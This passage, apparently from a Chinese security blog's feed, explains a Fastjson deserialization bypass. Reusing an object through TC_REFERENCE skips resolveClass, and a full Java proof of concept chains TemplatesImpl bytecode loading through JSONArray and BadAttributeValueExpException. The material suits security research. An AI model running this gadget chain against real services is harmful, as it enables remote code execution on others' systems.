-<p><img src="/2023/11/10/fastjson%20%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231027114826853.png" alt="image-20231027114826853"></p>
-<p>所以想要不执行<code>resolveClass</code>就要考虑如何才能不执行<code>readClassDesc()</code>，而<code>switch</code>语句中有这么几个分支不会走到该方法<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p>
-<p>其中TC_REFERENCE是引用类型，如果一个对象被多次引用，那么只会在第一次出现时进行完整地反序列化，而后面的引用将使用 TC_REFERENCE 进行标记</p>
-<p>因此在调用时，往List、set、map类型中添加同样对象即可成功利用，即：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//List</span></span><br><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">set.add(templates);</span><br><span class="line">set.add(badAttributeValueExpException);</span><br><span class="line"><span class="comment">//map</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(templates,badAttributeValueExpException);</span><br></pre></td></tr></table></figure>
-
-<p>POC</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDeser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;S1nJa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(templates);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray= <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line"></span><br><span class="line">        set.add(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] serilize = serilize(set);</span><br><span class="line">        unserilize(serilize);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serilize(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserilize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object o, String fieldName,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> o.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(o,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;Exec.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Fastjson</tag>
       </tags>
   </entry>
   <entry>
